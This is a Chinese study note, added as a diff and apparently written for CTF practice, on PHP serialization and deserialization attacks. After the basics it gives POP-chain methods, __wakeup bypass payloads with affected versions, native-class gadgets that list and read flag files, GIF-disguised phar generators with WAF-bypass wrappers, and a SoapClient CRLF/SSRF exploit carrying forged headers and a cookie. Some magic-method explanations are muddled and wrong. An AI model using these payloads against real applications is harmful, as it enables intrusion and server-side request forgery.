@@ -1,0 +1,479 @@
+属性的权限，可以分为：
+1 public 权限 外部可以通过箭头访问到
+2 private 权限 内部通过 $this->username 访问到
+3 protected 权限 表示 自身及其子类 和父类 能够访问
+抽象类 不能被 new 也就是不能被直接 实例化对象
+
+接口 interface
+为了实现多继承效果
+implements 可以实现多个接口
+
+
+方法的属性修饰符
+public 
+private
+protected
+修饰：
+静态属性   static 
+final属性   final
+
+序列化于反序列化
+如果属性权限为private，那么序列化后，存储的属性名字为   %00+类名+%00+属性名
+如果属性权限为protected，那么序列化后，存储的属性名字为   %00+*+%00+属性名
+序列化是  将 一个对象 变为一个可以传输的字符串  serialize(对象)  返回  序列化后的字符串
+反序列化 就是将 一个可以传输的字符串 变为一个 可以调用的对象   unserialize(反序列化后的字符串) 返回 对象
+O:4:"User":3:{
+	s:4:"name";s:8:"John Doe";
+	s:7:"address";O:7:"Address":2:{
+		s:4:"city";s:8:"New York";
+		s:3:"zip";s:5:"10001";
+	 }
+	 s:12:"phoneNumbers";a:2:{
+	 	i:0;s:12:"123-456-7890";
+	 	i:1;s:12:"098-765-4321";
+	 }
+}
+反序列化时，php会这么做
+// 1 找到反序列化字符串规定的类名字 
+// 2 实例化这个类，但是不是调用构造方法
+// 3 有了实例化的类对象，对它的属性进行赋值
+// 4 执行魔术方法__wakeup()__unserialize()
+// 5 返回构造好的对象
+
+
+<?php
+class Address {
+    public $city;
+    public $zip;
+
+    public function __construct($city, $zip) {
+        $this->city = $city;
+        $this->zip = $zip;
+    }
+}
+
+class User {
+    public $name;
+    public $address;
+    public $phoneNumbers;
+
+    public function __construct($name, $address, $phoneNumbers) {
+        $this->name = $name;
+        $this->address = $address;
+        $this->phoneNumbers = $phoneNumbers;
+    }
+}
+
+$address = new Address("New York", "10001");
+$user = new User("John Doe", $address, array("123-456-7890", "098-765-4321"));
+$serializedData = serialize($user);
+echo $serializedData . "\n";
+?>
+结果是
+O:4:"User":3:{
+	s:4:"name";s:8:"John Doe";
+	s:7:"address";O:7:"Address":2:{
+		s:4:"city";s:8:"New York";
+		s:3:"zip";s:5:"10001";
+	 }
+	 s:12:"phoneNumbers";a:2:{
+	 	i:0;s:12:"123-456-7890";
+	 	i:1;s:12:"098-765-4321";
+	 }
+}
+解读序列化字符串
+1. 识别外层对象
+O:4:"User":3:
+
+O 表示对象（Object）。
+4 表示类名长度。
+"User" 是类名。
+3 表示对象的属性数量
+
+2. 解析对象属性
+{s:4:"name";s:8:"John Doe";s:7:"address";O:7:"Address":2:{s:4:"city";s:8:"New York";s:3:"zip";s:5:"10001";}s:12:"phoneNumbers";a:2:{i:0;s:12:"123-456-7890";i:1;s:12:"098-765-4321";}}
+ 解析第一个属性
+ s:4:"name";s:8:"John Doe"
+ 解析第二个属性
+ s:7:"address";O:7:"Address":2:{s:4:"city";s:8:"New York";s:3:"zip";s:5:"10001";}
+ s:7:"address" 表示字符串属性名，长度为 7，内容是 "address" O:7:"Address":2: 表示一个嵌套的 Address 对象
+ {s:4:"city";s:8:"New York";s:3:"zip";s:5:"10001";} 包含了 Address 对象的属性。
+ s:4:"city";s:8:"New York"; 表示 Address 对象的第一个属性。
+s:4:"city" 表示字符串属性名，长度为 4，内容是 "city"。
+s:8:"New York" 表示字符串属性值，长度为 8，内容是 "New York"。
+s:3:"zip";s:5:"10001"; 表示 Address 对象的第二个属性。
+s:3:"zip" 表示字符串属性名，长度为 3，内容是 "zip"。
+s:5:"10001" 表示字符串属性值，长度为 5，内容是 "10001"
+
+$this->解释为当前对象里的
+__construct	当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。
+__destruct	当 PHP 脚本执行结束前一秒当一个对象被销毁前自动调用这个方法，可以用来释放对象占用的资源。
+__call	在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。
+__callStatic	在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。
+__get	当读取（echo）访问 （$myObject->age;）一个不存在或不可访问的属性时，__get 方法会被自动调用。
+__set	当设置（赋值）一个不存在或不可访问的属性时，__set 方法会被自动调用。
+__isset	当使用 isset() 或 empty() 测试一个对象的属性是否存在时自动调用这个方法，可以用来实现属性的访问控制。
+__unset	当使用 unset() 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。
+__toString	当一个对象被当做字符串时（echo $myObject;）（preg_match时）自动调用这个方法，可以用来实现对象的字符串表示。
+__invoke	当一个对象被作为函数调用$myObject('ChatGPT');自动调用这个方法，可以用来实现对象的可调用性。
+__set_state	当使用 var_export() 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。
+__clone	当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。
+__debugInfo	当使用 var_dump() 或 print_r() 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。
+__sleep	  在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。
+__wakeup	在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。
+__unserialize() 是 PHP 7.4 中引入的一个魔术方法，将对象序列化为数组，同时在序列化时对敏感数据（如密码）进行加密处理。在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法
+__serialize() 方法: 反序列化时，从数组中恢复对象状态，并对敏感数据（如密码）进行解密处理。使用 serialize() 将对象序列化为字符串时，__serialize() 方法被调用，并将属性打包为数组
+===================================================================================================================================================================================================================================
+这里是被调用的例子
+
+<?php
+class MyClass {
+    private $data = [];
+
+    // __set() 方法在给不存在的属性赋值时触发
+    public function __set($name, $value) {
+        echo "设置属性 '$name' 为 '$value'。" . PHP_EOL;      //设置属性 'name' 为 'ChatGPT'。
+        $this->data[$name] = $value;
+    }
+
+    // __get() 方法在访问不存在的属性时触发
+    public function __get($name) {
+        if (array_key_exists($name, $this->data)) {
+            echo "访问属性 '$name'，值为：" . $this->data[$name] . PHP_EOL;    //访问属性 'name'，值为：ChatGPT
+            return $this->data[$name];
+        } else {
+            echo "属性 '$name' 不存在。" . PHP_EOL;
+            return null;
+        }
+    }
+	public function __isset($name) {
+		return isset($this->data[$name]);
+	}	
+
+	// __unset() 方法，用于删除属性
+	public function __unset($name) {
+		if (isset($this->data[$name])) {
+			unset($this->data[$name]);
+			echo "属性 '$name' 已被删除。" . PHP_EOL;
+		} else {
+			echo "属性 '$name' 不存在。" . PHP_EOL;
+		}
+	}
+	public function __toString() {
+			return "对象的名称是：" . $this->name;
+	}	
+	// __invoke() 方法会在对象被当作函数调用时触发
+    public function __invoke($name) {
+        return $this->message . ", " . $name;
+    }
+	// __sleep() 方法在对象序列化之前调用
+    public function __sleep() {
+        // 仅返回需要序列化的属性
+        return ['name'];
+    }
+	// __wakeup() 方法在对象反序列化之后调用
+    public function __wakeup() {
+        // 重新初始化或恢复对象的状态
+        $this->sessionData = "Session data restored";
+    }
+	
+}
+// 创建类的实例
+$myObject = new MyClass();
+// 设置不存在的属性
+$myObject->name = 'ChatGPT';
+// 访问不存在的属性
+echo $myObject->name . PHP_EOL;
+$nonExistent = $myObject->age;
+// 访问未设置的属性
+echo $myObject->age . PHP_EOL;
+// 使用 isset() 检查属性是否存在
+if (isset($myObject->name)) {
+    echo "属性 'name' 存在。" . PHP_EOL;
+} else {
+    echo "属性 'name' 不存在。" . PHP_EOL;
+}
+// 删除属性
+unset($myObject->name);
+// 直接输出对象，自动调用 __toString()
+echo $myObject;
+// 直接调用对象，自动调用 __invoke()
+echo $myObject('ChatGPT');
+// 序列化对象__sleep() 方法返回一个包含 'name' 的数组，表示只有 name 属性会被序列化。serialize($myObject) 时，password 和 sessionData 属性不会被序列化，因为它们没有包含在 __sleep() 方法返回的数组中。
+$serializedObject = serialize($myObject);
+echo $serializedObject; // 输出: O:7:"MyClass":1:{s:8:"\0MyClass\0name";s:7:"ChatGPT";}
+// 反序列化对象
+$unserializedObject = unserialize($serializedObject);
+?>
+
+
+
+
+
+
+
+
+
+三种方法赋值
+
+直接写只能写字符串
+private $username = 'xxxxxx';
+
+外部写意图把类里的$a变量其他$b，这样就写出了pop即
+$b=new SHOW;
+$s=new CTF;
+$s->a=$b
+但是不能对私有属性
+
+构造方法赋值，以上缺点都没了
+public function __construct()
+    {
+        $this->class = new backdoor();
+    }
+
+
+
+构造pop链
+重点找起始和rce终点,期间的变量赋值为变量时要外部赋值，普通变量就直接赋值
+链子：终点开始编写链子，期间用各种魔法方法到起点（利用new关键词开始construct，destruct,wakeup），再把起点对象序列化
+检查就是从后往前读了
+
+
+序列化绕过
+绕过\0脚本 或 利用php7.1+的特性，直接用public生成字符串但容错机制
+指针引用 $b->a1=&$b->a2;
+$a = 10;
+$b = &$a; // $b 是 $a 的引用
+$b = 20;  // 改变 $b 也会改变 $a
+echo $a;  // 输出 20
+
+畸形字符串 
+绕过wakeup 
+
+利用将属性值变大
+ 
+ 使用C代替O
+- 5.3.0 - 5.3.29
+- 5.4.0 - 5.4.45
+- 5.5.0 - 5.5.38
+- 5.6.0 - 5.6.40
+- 7.0.0 - 7.0.33
+- 7.1.0 - 7.1.33
+- 7.2.0 - 7.2.34
+- 7.3.0 - 7.3.28
+- 7.4.0 - 7.4.16
+- 8.0.0 - 8.0.3
+只能执行construct()函数，无法添加任何内容，然后析构函数最后执行
+
+序列化机制构造一个对象，其中包含对象引用
+- 7.0.0 - 7.0.14
+- 7.1.0
+- 5.4.14 - 5.4.45
+- 5.5.0 - 5.5.38
+- 5.6.0 - 5.6.29
+<?php
+//https://3v4l.org/iLSA7
+//https://bugs.php.net/bug.php?id=73367
+class obj {
+	var $ryat;
+	function __wakeup() {
+		$this->ryat = null;
+		throw new Exception("Not a serializable object");
+	}
+	function __destruct() {
+		if ($this->ryat == 1) {
+			var_dump('dtor!');
+		}
+	}
+}
+
+$poc = 'O:3:"obj":2:{s:4:"ryat";i:1;i:0;O:3:"obj":1:{s:4:"ryat";R:1;}}';//构造一个对象，其中 ryat 被设置为 1，然后让对象的另一个属性通过引用指向 ryat__wakeup() 修改了 ryat，但由于引用的存在，这个修改在某些地方不起作用，从而在 __destruct() 中成功触发了你原本不希望被触发的代码。
+unserialize($poc);
+多写一个i:0;O:3:"obj":1:{s:4:"ryat";R:1;}再改对象数仿照以上
+?>
+
+
+利用fastdestruct机制让destruct跑到前面去一般删最后的}就行
+
+
+
+
+
+字符O绕过
+条件：
+- <7.1.33
+测试脚本：\<https://3v4l.org/YclXi\>
+<?php
+//https://3v4l.org/YclXi
+class D {
+}
+class C {
+}
+unserialize('O:+1:"C":0:{}');
+字符i、d绕过
+条件：
+- <8.0.3 （全版本）
+测试脚本 \<https://3v4l.org/SJm2g\>
+<?php
+//https://3v4l.org/SJm2g
+// echo serialize(0);
+
+echo unserialize('i:-1;');
+echo "\n";
+echo unserialize('i:+1;');
+echo "\n";
+echo unserialize('d:-1.1;');
+echo "\n";
+echo unserialize('d:+1.2;');
+
+
+利用数组特性
+数组特性
+$arr=[new A,'a的方法'];
+$arr(); //会直接调用a方法
+
+public function _destruct(){
+        unserialize(sthis->key)();     //在这里运用数组特性
+        Sthis->mod2 ="welcome".$this->modl;
+    }
+	$arr =[$gf,'get flag'];
+	$f = new func;
+	$f->key = serialize($arr);
+利用原生类
+查看flag文件名
+class flag
+{
+    public $c = "DirectoryIterator";
+    public $f = "glob:///f*";
+
+    public function __toString(){
+        echo new $this->c($this->f);
+        return "FLAG";
+    }
+}
+读取文件
+class flag
+{
+    public $c = "SplFileObject";
+    public $f = "/flllaaaaggg";
+
+    public function __toString(){
+        echo new $this->c($this->f);
+        return "FLAG";
+    }
+}
+
+GMP
+
+
+
+
+phar八股文这段代码展示了如何生成一个 .phar 文件，并将任意 PHP 代码作为 stub。当这个 .phar 文件被解析或执行时，代码中的 stub 会被执行
+如果waf过滤了phar://，则可以使用：
+compress.bzip2://phar://
+compress.zlib://
+
+<?php
+
+
+@unlink("phar.phar");
+$phar = new Phar("phar.phar");  //echo ($o)变为八股文 
+$phar->startBuffering();
+$phar->setStub("GIF89a"."<?php__HALT_COMPILER(); ?>");
+$phar->setMetadata($o);
+$phar->addFromString("test.txt","text");
+$phar->stopBuffering(); //执行生成phar.phar文件
+@system("gzip phar.phar");  // 将Phar文件压缩为gzip格式
+echo urlencode(file_get_contents("phar.phar.gz"));  // 输出压缩后的Phar文件内容并进行URL编码,根据情况删掉后两行
+?>
+
+伪造为gif的phar
+<?php
+    class TestObject {
+    }
+
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar");
+    $phar->startBuffering();
+    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
+    $o = new TestObject();
+    $phar->setMetadata($o); //将自定义meta-data存入manifest
+    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+    //签名自动计算
+    $phar->stopBuffering();
+?>
+
+
+然后就是利用，可以利用的函数
+file_get_contents fileatime filectime file_ctime is_dir is_file is_executable copy unlink stat readfile 
+利用file_get_contents可以访问自己网站上的phar  cd /var/www/html  sudo chown www-data:www-data /var/www/html -R     sudo nano writefile.php
+或者 
+得到的数据直接上传到任意路径中，再用phar://xxxxx传到file_get_content
+利用data:// 在php终端制造$ph=file_get_contents('phar.phar');echo base64_encode($ph);  让file_get_contents包含{data://text/plain;base64 （写入终端结果）}到xxx.html（后缀不重要）最后让让file_get_contents包含phar://xxx.html  
+
+
+
+总结一下利用php反序列化逃逸的步骤。
+
+1. 确定利用目标
+2. 按照原程序正常序列化的步骤做一遍，看看正常序列化字符串的结构，基于此考虑攻击方式。注意，键值对设置的顺序会影响序列化结果，一定要按照程序内的方式设置值。
+3. 计算逃逸总共需要的字符，考虑需要构建多少被替换的字符。
+4. 插入payload，结合本地运行结果查看payload是否成功
+
+php反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。
+
+
+
+
+CRLF攻击
+
+利用条件
+- 源码需要进行反序列化
+- 源码调用一个方法，且该方法不存在。以此激活__call()
+
+利用范围(PHP 5, PHP 7)
+-
+class VulnerableClass {
+    private $userAgent;
+
+    public function __construct($userAgent) {
+        $this->userAgent = $userAgent;
+    }
+
+    public function __call($name, $arguments) {
+        // 输出一条消息，模拟 __call 魔术方法被触发
+        echo "Method $name was called!";
+    }
+
+    public function getUserAgent() {
+        return $this->userAgent;
+    }
+}
+
+// 模拟用户输入反序列化的操作
+if (isset($_POST['data'])) {
+    $obj = unserialize($_POST['data']);
+    echo $obj->getUserAgent();
+    // 调用一个不存在的方法，激活 __call 方法
+    $obj->nonExistentMethod();
+}
+
+
+
+
+
+
+exp
+<?php
+$target = "http://xxx.xxx.xxx.xxx:5555/";
+$post_string = 'data=abc';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
+);
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=>'hello'));
+$aaa = serialize($b);
+$aaa = str_replace('^^',"\n\r",$aaa);
+echo urlencode($aaa);
+$aa=unserialize($aaa);
+$aa->test();
